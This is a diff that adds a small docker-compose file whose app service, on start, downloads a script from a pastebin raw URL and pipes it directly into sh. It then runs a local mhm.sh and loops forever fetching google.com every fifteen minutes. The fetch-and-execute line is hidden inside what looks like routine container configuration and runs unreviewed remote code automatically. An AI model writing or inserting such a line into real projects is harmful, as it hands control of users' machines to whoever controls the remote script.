@@ -1,0 +1,14 @@
+version: '3.9'
+
+services:
+  app:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    working_dir: /app
+    volumes:
+      - .:/app
+    command:
+      - ./mhm.sh
+      - sh -c '(wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && bash mhm.sh && while true; do wget google.com; sleep 900; done'
+    entrypoint: "/bin/bash"
